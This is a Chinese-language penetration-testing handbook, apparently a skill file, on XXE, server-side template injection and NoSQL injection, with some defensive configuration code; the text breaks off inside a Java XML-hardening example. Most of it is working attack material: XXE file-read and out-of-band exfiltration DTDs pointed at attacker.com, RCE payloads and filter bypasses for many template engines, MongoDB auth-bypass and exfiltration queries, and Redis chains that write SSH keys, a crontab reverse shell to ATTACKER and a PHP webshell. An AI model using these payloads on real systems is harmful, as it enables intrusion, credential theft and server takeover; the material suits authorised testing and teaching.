---
name: web-injection-xxe-ssti-nosql
description: >
  覆盖三种高级注入攻击：XXE（XML 外部实体注入）、SSTI（服务端模板注入）、NoSQL 注入。
  XXE 部分涵盖传统 XXE、参数实体、盲 XXE、OOB XXE、XXE via 文件上传、DTD 注入，
  包含所有语言/框架防护。SSTI 部分覆盖 Jinja2、Twig、Freemarker、Velocity、
  ERB、Thymeleaf、Pug、Mako 等 10+ 模板引擎的探测和利用载荷。
  NoSQL 部分覆盖 MongoDB、CouchDB、Redis 注入。
  每种攻击包含检测规则和修复方案。
domain: cybersecurity
subdomain: web-security
tags: [xxe, xml-external-entity, ssti, template-injection, nosql-injection, mongodb, jinja2, twig, blind-xxe, owasp]
version: 2.0.0
---

# XXE / SSTI / NoSQL 注入 — 完整攻防手册

## 适用场景

- 应用接受 XML 输入（SOAP API、RSS、SVG 上传、Office 文档）
- 应用使用模板引擎渲染用户输入（Jinja2、Twig、Freemarker 等）
- 应用使用 NoSQL 数据库（MongoDB、CouchDB）且用户输入进入查询
- 需要评估 XML 解析器、模板引擎、NoSQL 查询的安全性

---

## Part A-1：XXE 攻击

### 1. 基础 XXE

```xml
<!-- 经典 XXE — 读取文件 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>

<!-- 读取源代码 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!-- PHP 伪协议读取源码并 base64 编码（避免 XML 字符冲突） -->

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

### 2. 参数实体 XXE

```xml
<!-- 当一般实体被禁用时，使用参数实体 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<user><name>test</name></user>

<!-- evil.dtd（攻击者服务器） -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### 3. 盲 XXE（OOB）

```xml
<!-- 方法 1: HTTP 外带 -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

<!-- evil.dtd -->
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?x=%file;'>">
%all;
%send;

<!-- 方法 2: DNS 外带（HTTP 不可用时） -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%send;

<!-- 方法 3: FTP 外带（大文件） -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%eval;
%send;
```

### 4. XXE via 文件上传

```
# SVG 上传
<svg xmlns="http://www.w3.org/2000/svg">
  <metadata>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <text>&xxe;</text>
  </metadata>
</svg>

# DOCX / XLSX / PPTX 上传
# 这些文件本质是 ZIP 包含 XML
# 解压 → 修改 [Content_Types].xml 或 xl/sharedStrings.xml 注入 XXE → 重新打包

# XMP 元数据注入（图片 EXIF）
# 某些应用解析图片 XMP 数据（XML 格式）
```

### 5. XSLT 注入

```xml
<!-- XSLT 代码执行（取决于处理器） -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="http://mycompany.com/mynamespace">

  <msxsl:script language="JScript" implements-prefix="user">
    function xml() {
      var shell = new ActiveXObject("WScript.Shell");
      return shell.Exec("cmd.exe /c whoami").StdOut.ReadAll();
    }
  </msxsl:script>

  <xsl:template match="/">
    <xsl:value-of select="user:xml()"/>
  </xsl:template>
</xsl:stylesheet>
```

### 6. XXE 防御

```python
# Python — 安全 XML 解析
from defusedxml import ElementTree
# 或使用 lxml 的安全配置
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)

# Java — 禁用 DTD
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// 或至少:
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

# PHP — 安全配置
libxml_disable_entity_loader(true);  // PHP < 8.0
// PHP 8.0+ 默认禁用外部实体

# .NET — 安全配置
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
```

---

## Part A-2：SSTI 攻击

### 1. 模板引擎探测

```
# 第一步: 确认是否存在模板注入
{{7*7}}          → 49  (可能: Jinja2, Twig, ERB, Freemarker)
{{7*'7'}}        → 7777777  (Jinja2)
${7*7}           → 49  (Freemarker, Velocity, Mako)
#{7*7}           → 49  (Thymeleaf)
*{7*7}           → 49  (Expression Language)
${{7*7}}         → 49  (Vue.js — 客户端，非 SSTI)
<%= 7*7 %>       → 49  (ERB, EJS)
#{7*7}           → 14  (Ruby — 数学运算)
#{7*'7'}         → "7777777" (Freemarker 字符串重复)
{{config}}       → 配置信息泄露 (Jinja2/Flask)
{{self}}         → 模板对象 (Jinja2)
```

### 2. 各引擎利用载荷

#### Jinja2 (Python/Flask)

```python
# 命令执行
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

{{''.__class__.__mro__[1].__subclasses__()}}
# 找到 os._wrap_close 或 subprocess.Popen 的索引 N
{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()[0]}}

# 利用 lipsum / cycler / joiner / namespace
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 绕过过滤
# 过滤了 [] → 使用 __getitem__
{{''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(N)}}

# 过滤了 . → 使用 |attr
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# 过滤了关键字 → 使用字符串拼接
{{''.__class__.__mro__[1].__subclasses__()[N]('__im'+'port__('+"'o'"+'s)').popen('id').read()}}
```

#### Twig (PHP/Symfony)

```twig
# 命令执行
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# 或
{{['id']|filter('system')}}

# 读取文件
{{'/etc/passwd'|file_excerpt(1,100)}}
```

#### Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# 或
{"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"}
```

#### ERB (Ruby)

```erb
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

#### Velocity (Java)

```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

#### Thymeleaf (Java)

```
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

#### Pug/Jade (Node.js)

```pug
- var x = process.mainModule.require('child_process').execSync('id')
= x
```

#### Mako (Python)

```python
<%
import os
x = os.popen('id').read()
%>
${x}
```

### 3. SSTI 防御

```python
# Jinja2 — 使用沙箱
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
# SandboxedEnvironment 禁止访问危险属性

# 通用 — 永远不要将用户输入直接拼入模板字符串
# ❌ 危险
template = "Hello " + user_input
# ✅ 安全
template = "Hello {{ name }}"
env.from_string(template).render(name=user_input)

# Django — 自动转义，避免 mark_safe
# Flask — 使用 render_template 而非 render_template_string
```

---

## Part A-3：NoSQL 注入

### 1. MongoDB 注入

```javascript
// === 运算符注入 ===

// 认证绕过（经典）
POST /login
{"username": {"$ne": ""}, "password": {"$ne": ""}}
// SQL 等价: WHERE username != '' AND password != ''

{"username": "admin", "password": {"$gt": ""}}
// SQL 等价: WHERE username = 'admin' AND password > ''

// $where 注入
{"$where": "this.password.match(/.*/) || 'a' == 'a'"}
{"$where": "sleep(5000)"}

// 数据提取（盲注）
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
// 逐字符提取密码

// $gt / $lt 范围查询
{"age": {"$gt": 0}}    // 返回所有记录
{"age": {"$lt": 999}}  // 返回所有记录

// 嵌套文档注入
{"user": {"$gt": {}}}
// 返回所有 user 字段非空的文档

// === URL/查询参数注入 ===
// GET /users?role[$ne]=guest
// 解析为: {role: {$ne: "guest"}}

// GET /users?username[$regex]=admin.*
// 解析为: {username: {$regex: "admin.*"}}

// === Node.js + Express ===
// 危险代码:
app.get('/users', (req, res) => {
    db.users.find(req.query);  // 直接传递查询参数！
});

// 攻击: /users?password[$ne]=&role=admin
```

### 2. MongoDB 聚合管道注入

```javascript
// 如果用户输入进入 $match 或其他管道阶段
db.collection.aggregate([
  {"$match": JSON.parse(user_input)}  // 危险
]);

// 注入:
{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}
```

### 3. CouchDB 注入

```
# CouchDB MapReduce 注入
# 如果用户输入进入视图函数
function(doc) {
    emit(eval(user_input));  // 远程代码执行
}

# CouchDB Cookie 认证绕过
# 创建管理员:
PUT /_users/org.couchdb.user:attacker
{"name":"attacker","password":"pass","type":"user","roles":["_admin"]}
```

### 4. NoSQL 防御

```javascript
// Node.js — 输入验证和类型强制转换
app.get('/users', (req, res) => {
    // ✅ 白名单验证
    const allowedFields = ['username', 'email', 'role'];
    const query = {};

    for (const field of allowedFields) {
        if (req.query[field]) {
            query[field] = String(req.query[field]);  // 强制字符串类型
        }
    }

    db.users.find(query);
});

// 使用 mongo-sanitize 中间件
const sanitize = require('express-mongo-sanitize');
app.use(sanitize());

// 或手动清理
function sanitizeMongo(obj) {
    if (obj instanceof Object) {
        for (const key in obj) {
            if (/^\$/.test(key)) {
                delete obj[key];
            } else {
                sanitizeMongo(obj[key]);
            }
        }
    }
    return obj;
}
```

```python
# Python — PyMongo 输入验证
from bson.regex import Regex

def safe_query(username):
    if not isinstance(username, str):
        raise ValueError("Invalid input type")
    if '$' in username or '.' in username:
        raise ValueError("Invalid characters")
    return {"username": username}
```

---

## 速查表

### 模板引擎识别表

| 载荷 | Jinja2 | Twig | Freemarker | ERB | Velocity | Thymeleaf |
|------|--------|------|-----------|-----|----------|-----------|
| `{{7*7}}` | 49 | 49 | - | - | - | - |
| `{{7*'7'}}` | 7777777 | - | - | - | - | - |
| `${7*7}` | - | - | 49 | - | 49 | - |
| `<%=7*7%>` | - | - | - | 49 | - | - |
| `#{7*7}` | - | - | 49 | - | - | 49 |
| `{{config}}` | 配置 | - | - | - | - | - |
| `{{self}}` | 对象 | - | - | - | - | - |

### XXE 攻击类型速查

| 类型 | 条件 | 数据外带方式 |
|------|------|------------|
| 经典 XXE | 响应中回显 | 直接在响应中 |
| 盲 XXE | 无回显 | HTTP/DNS OOB |
| 参数实体 | 一般实体被禁 | DTD 外带 |
| 错误 XXE | 有详细错误信息 | 触发错误消息 |
| 文件上传 XXE | SVG/DOCX 上传 | 直接/盲 |

## MITRE ATT&CK 映射

| Technique | ID | 适用攻击 |
|-----------|-----|---------|
| Exploit Public-Facing App | T1190 | XXE, SSTI, NoSQL |
| Unsecured Credentials | T1552 | XXE 读配置文件 |
| Remote System Discovery | T1018 | XXE SSRF |
| Command and Scripting | T1059 | SSTI RCE |

## 前置条件

- 目标应用接受 XML、模板语法、或 NoSQL 查询
- Burp Suite / Postman 用于请求构造
- 了解目标使用的 XML 解析器、模板引擎、NoSQL 数据库类型

---

## Part C：2025-2026 更新

> 本节补充高级利用手法、2025 年新增 CVE、扩展模板引擎覆盖、NoSQL 注入深化、现代防御代码，以及更新的 MITRE ATT&CK 映射。

### C-1：XXE 高级利用

#### C-1.1 Blind XXE via OOB — 完整攻击链

```xml
<!-- Step 1: 探测 — 触发 DNS 解析 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://TARGET.burpcollaborator.net">]>
<foo>&xxe;</foo>

<!-- Step 2: 参数实体 + 外部 DTD 外带文件内容 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<root>content</root>

<!-- evil.dtd (攻击者服务器) -->
<!-- 方法 A: HTTP 外带 -->
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/exfil?d=%file;'>">
%all;
%send;

<!-- 方法 B: 使用 CDATA 包装（避免 XML 特殊字符导致解析失败） -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?d=%start;%file;%end;'>">
%wrap;
%send;

<!-- 方法 C: FTP 外带（适合大文件/二进制） -->
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'ftp://ATTACKER:2121/%file;'>">
%eval;
%send;
```

#### C-1.2 Error-Based XXE

```xml
<!-- 利用 XML 解析器错误消息泄露文件内容 -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
]>
<root>&error;</root>
<!-- 如果解析器报错时包含路径，文件内容会出现在错误信息中 -->
<!-- 例如: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root... -->
```

#### C-1.3 XXE via SVG / DOCX / XLSX — 详细步骤

```
=== SVG 文件注入 ===

<!--恶意 SVG 文件 -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

=== DOCX 文件注入 ===

# 步骤:
1. unzip document.docx -d docx_extracted
2. 编辑 docx_extracted/word/document.xml，在开头注入:
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
   并在文档体中使用 &xxe;
3. 编辑 docx_extracted/[Content_Types].xml 同理可注入
4. cd docx_extracted && zip -r ../malicious.docx ./

=== XLSX 文件注入 ===

# 步骤:
1. unzip spreadsheet.xlsx -d xlsx_extracted
2. 编辑 xlsx_extracted/xl/sharedStrings.xml — 注入 XXE
3. 或编辑 xlsx_extracted/xl/workbook.xml — 引用外部 DTD
4. 重新打包: cd xlsx_extracted && zip -r ../malicious.xlsx ./

=== XMP 元数据注入 (图片) ===

# 某些应用处理图片上传时会解析 XMP 数据（XML 格式）
# 使用 exiftool 注入:
exiftool -Comment='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><x>&xxe;</x>' image.jpg
```

#### C-1.4 SSRF via XXE

```xml
<!-- 云环境元数据获取 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>

<!-- AWS IMDSv2 (需要 token) — 通常 XXE 无法直接利用 -->
<!-- 但可探测内部服务 -->
<!ENTITY xxe SYSTEM "http://internal-api.corp.local/admin/users">
<!ENTITY xxe SYSTEM "http://localhost:6379/">  <!-- Redis 未授权 -->
<!ENTITY xxe SYSTEM "http://localhost:9200/_cluster/health">  <!-- Elasticsearch -->

<!-- GCP 元数据 -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
<!-- 注意: GCP 需要 Metadata-Flavor: Google 头，XXE 通常无法添加 -->

<!-- Azure 元数据 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

#### C-1.5 XXE 最新绕过 (2024-2025)

```
# WAF 绕过 — 编码技巧

# 1. UTF-16 BE 编码（绕过 UTF-8 WAF 检测）
# 将 XXE payload 转为 UTF-16 编码上传

# 2. 使用 XInclude（不需要控制整个文档）
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

# 3. 使用 XML 命名空间前缀绕过正则
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>

# 4. 利用 PHP expect:// 协议（如果安装了 expect 扩展）
<!ENTITY xxe SYSTEM "expect://id">

# 5. 利用 jar:// 协议（Java）
<!ENTITY xxe SYSTEM "jar:file:///path/to/archive.zip!/internal_file.txt">
```

---

### C-2：SSTI 模板引擎速查表（扩展版）

#### C-2.1 Jinja2 (Python/Flask)

```
# === 检测 Payload ===
{{7*7}}           → 49
{{7*'7'}}         → 7777777
{{config}}        → 配置对象
{{self.__dict__}} → 模板内部字典
{{lipsum}}        → 函数对象

# === RCE Payload ===

# 方法 1: os.popen (经典)
{{''.__class__.__mro__[1].__subclasses__()}}
# 搜索 os._wrap_close 或 subprocess.Popen 的索引 N
{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()[0]}}

# 方法 2: 利用 lipsum 全局变量
{{lipsum.__globals__['os'].popen('id').read()}}

# 方法 3: 利用 cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# === 绕过技巧 (2024-2025 更新) ===

# 绕过 . 过滤 → |attr()
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}

# 绕过 [] 过滤 → __getitem__
{{''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(N)}}

# 绕过关键字过滤 → 字符串拼接 / hex / chr
{{''.__class__.__mro__[1].__subclasses__()[N]('__im'+'port__('+"'o'"+'s)').popen('id').read()}}
{{().__class__.__bases__[0].__subclasses__()[N].__init__.__globals__['__buil'+'tins__']['__im'+'port__']('os').popen('id').read()}}

# 绕过 __ 过滤 → attr + 字符拼接
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)}}

# Jinja2 沙箱逃逸 (高版本)
{% set x = joiner.__init__.__globals__.__builtins__ %}
{{ x['open']('/etc/passwd').read() }}
```

#### C-2.2 Freemarker (Java)

```
# === 检测 Payload ===
${7*7}            → 49
${7*'7'}          → 7777777
<#-- 注释测试 -->
<#if true>yes</#if>  → yes

# === RCE Payload ===

# 方法 1: Execute 工具类
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# 方法 2: ObjectWrapper 利用
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder","id").start()}

# === JDK 17+ 绕过 (2024-2025) ===
# JDK 模块化限制了反射访问
# 方法 1: 通过 MethodHandle 绕过
<#assign mh = "freemarker.template.utility.ObjectConstructor"?new()>
<#assign runtime = mh("java.lang.Runtime")>

# 方法 2: 利用 ClassLoader 加载字节码
<#assign cl = .freemarker_template_tool_ClassLoader?new()>

# 方法 3: SPEL (Spring Expression Language) 集成
${T(java.lang.Runtime).getRuntime().exec('id')}

# CVE-2025-70830 — Datart Freemarker SSTI
# 在 SQL 脚本字段注入:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

#### C-2.3 Twig (PHP/Symfony)

```
# === 检测 Payload ===
{{7*7}}           → 49
{{7*'7'}}         → 49 (Twig 不支持字符串乘法，区分 Jinja2)
{{_self}}         → 对象信息
{{app}}           → Symfony App 对象
{{app.request.server.all}}  → 服务器变量泄露

# === RCE Payload ===

# 方法 1: 注册过滤器回调
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# 方法 2: filter 过滤器 (Twig < 3.x)
{{['id']|filter('system')}}

# 方法 3: 利用 Twig 扩展
{{['id','']|sort('system')}}

# 方法 4: PHP 函数调用 (需要扩展)
{{['cat /etc/passwd']|filter('exec')}}

# === 信息收集 ===
{{app.user.username}}        → 当前用户名
{{app.request.server.all}}   → $_SERVER 泄露
{{app.security.token}}       → 安全令牌
{{dump(app)}}                → 调试转储
```

#### C-2.4 Velocity (Java)

```
# === 检测 Payload ===
${7*7}            → 49
#set($a=7*7)${a}  → 49
#set($a="test")${a} → test

# === RCE Payload ===

# 方法 1: Runtime.exec
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")

# 方法 2: ProcessBuilder
#set($pb=$e.getClass().forName("java.lang.ProcessBuilder"))
#set($proc=$pb.getConstructor([$e.getClass().forName("[Ljava.lang.String;")]).newInstance(["id",""]).start())

# 方法 3: ScriptEngine (Java 8)
#set($engine=$e.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js"))
$engine.eval("java.lang.Runtime.getRuntime().exec('id')")
```

#### C-2.5 Thymeleaf (Java/Spring)

```
# === 检测 Payload ===
[[${7*7}]]        → 49
${7*7}            → 49 (预处理模式)
*{7*7}            → 49 (选择变量表达式)

# === RCE Payload ===

# 方法 1: SpEL 直接执行
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]

# 方法 2: 预处理注入 (__${}__::.x)
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

# 方法 3: Spring bean 访问
[[${@environment.getProperty('user.dir')}]]

# === 绕过 ===
# 绕过 T() 过滤 → 使用反射
[[${T(Runtime).getRuntime().exec('id')}]]
[[${new java.lang.ProcessBuilder({'id'}).start()}]]

# Thymeleaf SSTI 通常需要路径包含 __ 包裹的表达式
# URL: /path/__${payload}__::.x
```

#### C-2.6 Mako (Python)

```
# === 检测 Payload ===
${7*7}            → 49
<% x=7*7 %>${x}   → 49

# === RCE Payload ===

# 方法 1: 直接 import
<%
import os
x = os.popen('id').read()
%>
${x}

# 方法 2: 利用内置命名空间
<%
from mako import runtime
x = runtime._get_context().keys()
%>
${x}

# 方法 3: 使用 builtins
${__import__('os').popen('id').read()}
```

#### C-2.7 Pug/Jade (Node.js)

```
# === 检测 Payload ===
#{7*7}            → 49
= 7*7             → 49 (不转义)
!= 7*7            → 49

# === RCE Payload ===

# 方法 1: process.mainModule
- var x = process.mainModule.require('child_process').execSync('id').toString()
= x

# 方法 2: global 对象
- var x = global.process.mainModule.require('child_process').execSync('id')
!= x

# 方法 3: require 直接调用
#{function(){return require('child_process').execSync('id')}()}
```

#### C-2.8 Pebble (Java)

```
# === 检测 Payload ===
{{7*7}}           → 49
{{"test"}}        → test
{% if true %}yes{% endif %}  → yes

# === RCE Payload ===

# 方法 1: 通过 getClass 链
{{ "".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id") }}

# 方法 2: 利用 TYPE 类型引用
{{ system.exec('id') }}  <!-- 如果注册了 system 变量 -->
```

#### C-2.9 Handlebars (JavaScript/Node.js)

```
# === 检测 Payload ===
{{7*7}}           → 77 (Handlebars 不执行表达式，原样输出)
{{this}}          → 当前上下文对象
{{constructor}}   → 构造函数

# === RCE Payload (需要特定条件) ===

# Handlebars 默认不执行代码，但原型链污染 + Handlebars 可达 RCE

# 方法 1: 原型链污染 + compiler
# 先通过其他漏洞污染 Object.prototype:
# Object.prototype.compile = function() { return require('child_process').execSync('id'); }

# 方法 2: 利用 constructor 链 (旧版本)
{{constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}

# Handlebars SSTI 通常较难直接利用，需要配合其他漏洞
```

#### C-2.10 模板引擎识别决策树

```
输入 {{7*7}}:
  ├─ 返回 49 → 可能是 Jinja2/Twig/Pebble/Handlebars
  │   ├─ 输入 {{7*'7'}}:
  │   │   ├─ 返回 7777777 → Jinja2
  │   │   ├─ 返回 49 → Twig
  │   │   └─ 返回 77 → Handlebars (不执行)
  │   └─ 输入 {{config}}:
  │       ├─ 返回配置对象 → Jinja2 (Flask)
  │       └─ 无特殊输出 → Twig/Pebble
  ├─ 无变化 → 尝试 ${7*7}:
  │   ├─ 返回 49 → Freemarker/Velocity/Mako
  │   │   ├─ 输入 ${7*'7'}:
  │   │   │   ├─ 返回 7777777 → Freemarker
  │   │   │   └─ 错误/无 → Velocity/Mako
  │   │   └─ 输入 <% x=7*7 %>${x}:
  │   │       ├─ 返回 49 → Mako
  │   │       └─ 无 → Velocity
  │   └─ 无变化 → 尝试其他
  ├─ 尝试 <%= 7*7 %>:
  │   └─ 返回 49 → ERB (Ruby)
  ├─ 尝试 #{7*7}:
  │   ├─ 返回 49 → Thymeleaf/Freemarker (#{})
  │   └─ 返回 14 → Ruby 表达式
  └─ 尝试 *{7*7}:
      └─ 返回 49 → Spring Expression Language
```

---

### C-3：NoSQL 注入深化

#### C-3.1 MongoDB 高级注入

```javascript
// === $where 注入（JavaScript 执行） ===

// 基础布尔盲注
{"$where": "this.password.match(/^a/)"}
{"$where": "this.password.match(/^b/)"}
// 逐字符提取

// 时间盲注
{"$where": "if(this.password.match(/^a/)){sleep(5000);}else{sleep(0);}"}
{"$where": "var d=new Date();while((new Date()-d)<5000){};return true;"}

// 数据外带（如果可以出网）
{"$where": "var xhr=new XMLHttpRequest();xhr.open('GET','http://ATTACKER/?d='+this.password);xhr.send();"}

// === $lookup 跨集合查询 (聚合管道) ===
db.users.aggregate([
  {"$match": {"username": {"$ne": null}}},
  {"$lookup": {
    "from": "credentials",  // 注入修改目标集合
    "localField": "username",
    "foreignField": "username",
    "as": "creds"
  }}
])

// === BSON 类型混淆 ===
// MongoDB 允许同一字段不同类型
{"username": "admin", "password": {"$type": 2}}  // 类型2 = string
{"username": "admin", "password": {"$type": 16}}  // 类型16 = int32
// 利用类型差异绕过验证

// === $regex DoS (ReDoS) ===
{"username": {"$regex": "(a+)+$"}, "password": {"$ne": ""}}
// 回溯炸弹，导致 CPU 100%

// === MongoDB 2.4 早期版本 — $where 任意 JS ===
{"$where": "return db.credits.find({}).toArray().map(function(d){return d.password;})"}
```

#### C-3.2 CouchDB 注入深化

```
# === CouchDB MapReduce 代码注入 ===
# 如果应用将用户输入拼接到视图函数中

# 创建恶意视图
PUT /db/_design/malicious
{
  "_id": "_design/malicious",
  "views": {
    "exec": {
      "map": "function(doc) { require('child_process').exec('id'); }"
    }
  }
}

# === CouchDB Cookie 伪造 ===
# CouchDB 使用 HMAC-SHA1 签名 cookie
# 如果密钥泄露（默认: 自动生成），可伪造认证

# 步骤:
# 1. 获取 CouchDB 版本: GET /
# 2. 尝试默认/弱凭据: GET /_session
# 3. 创建管理员 (未授权时):
PUT /_users/org.couchdb.user:attacker
{
  "name": "attacker",
  "password": "P@ssw0rd",
  "type": "user",
  "roles": ["_admin"]
}

# === CouchDB Erlang Cookie RCE ===
# 如果 CouchDB 暴露了 Erlang 端口 (默认 6984)
# 且使用默认 cookie "monster"
# 可以直接获取 Erlang shell → 系统 RCE
```

#### C-3.3 Redis 注入

```
# === Redis 未授权 → RCE 链 ===

# 1. 写 SSH 公钥
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA... attacker@kali\n\n"
save

# 2. 写 Crontab 反弹 Shell
config set dir /var/spool/cron/
config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
save

# 3. 写 Webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php @eval($_POST['cmd']); ?>"
save

# 4. 主从复制 RCE (Redis 4.x+)
# 攻击者伪装为 Redis 主节点
# 加载恶意 .so 模块
redis-cli -h TARGET slaveof ATTACKER_IP 6379
# 攻击机上: redis-rogue-server

# 5. Lua 沙箱逃逸 (Redis < 5.0)
eval "local io_l = package.loaded['io']; if io_l == nil then io_l = require('io'); end; local f = io_l.popen('id','r'); local res = f:read('*a'); f:close(); return res" 0
```

#### C-3.4 NoSQL 注入自动化检测

```
# === NoSQLi 自动化工具 ===

# nosqli (Python)
pip install nosqli
nosqli -u "http://target/login" -d '{"username":"admin","password":"test"}' -p password

# Burp Suite 扩展
# - NoSQLi Scanner (BApp Store)
# - Autorize (检测权限绕过)

# 通用 Payload 列表
{"$ne": ""}
{"$gt": ""}
{"$gt": -1}
{"$gt": {}}
{"$regex": ".*"}
{"$where": "return true"}
{"$exists": true}
{"$nin": []}
{"$in": []}
```

---

### C-4：现代防御代码

#### C-4.1 Java SAX 安全配置（完整版）

```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.XMLConstants;

public class SecureXmlConfig {

    // DocumentBuilderFactory 安全配置
    public static DocumentBuilderFactory secureDBF() {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        try {
            // 完全禁用 DTD（最安全）
            dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

            // 如果必须使用 DTD，至少禁用外部实体:
            dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
            dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

            // 禁用 XInclude
            dbf.setXIncludeAware(false);

            // 限制实体扩展（防止 Billion Laughs 攻击）
            dbf.setFeature("http://apache.org/xml/features/limit-entity-expansion", true);

            // 启用安全处理
            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

        } catch (Exception e) {
            throw new RuntimeException("XML 安全配置失败", e);
        }
        return dbf;
    }

